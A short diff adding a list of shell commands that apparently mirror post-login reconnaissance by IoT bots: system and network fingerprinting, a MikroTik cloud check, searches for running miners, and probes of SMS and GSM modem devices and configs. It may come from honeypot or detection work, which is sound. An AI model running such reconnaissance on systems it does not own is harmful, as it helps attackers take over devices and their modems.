@@ -1,0 +1,8 @@
+/ip cloud print
+ifconfig
+uname -a
+cat /proc/cpuinfo
+ps | grep '[Mm]iner'
+ps -ef | grep '[Mm]iner'
+ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+echo Hi | cat -n
